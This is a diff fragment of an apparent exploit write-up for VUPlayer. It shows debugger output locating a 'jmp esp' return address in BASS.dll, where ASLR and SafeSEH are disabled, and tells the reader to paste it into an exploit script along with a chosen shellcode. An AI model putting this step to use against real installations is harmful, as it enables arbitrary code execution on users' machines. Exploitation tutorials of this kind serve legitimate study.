@@ -204,3 +204,16 @@ Log data, item 11
  Address=1002A659
  Message=  0x1002a659 : jmp esp |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASS.dll)
 ```
+Copy the ret address and paste on the script with your favorite "shell code flavour" and...
+
+```sh
+
+ __  __     ______     __   __   ______        ______     ______     __    __     ______        ______   __  __     __   __    
+/\ \_\ \   /\  __ \   /\ \ / /  /\  ___\      /\  ___\   /\  __ \   /\ "-./  \   /\  ___\      /\  ___\ /\ \/\ \   /\ "-.\ \   
+\ \  __ \  \ \  __ \  \ \ \'/   \ \  __\      \ \___  \  \ \ \/\ \  \ \ \-./\ \  \ \  __\      \ \  __\ \ \ \_\ \  \ \ \-.  \  
+ \ \_\ \_\  \ \_\ \_\  \ \__|    \ \_____\     \/\_____\  \ \_____\  \ \_\ \ \_\  \ \_____\     \ \_\    \ \_____\  \ \_\\"\_\ 
+  \/_/\/_/   \/_/\/_/   \/_/      \/_____/      \/_____/   \/_____/   \/_/  \/_/   \/_____/      \/_/     \/_____/   \/_/ \/_/ 
+                                                                                                                               
+```
+---
+
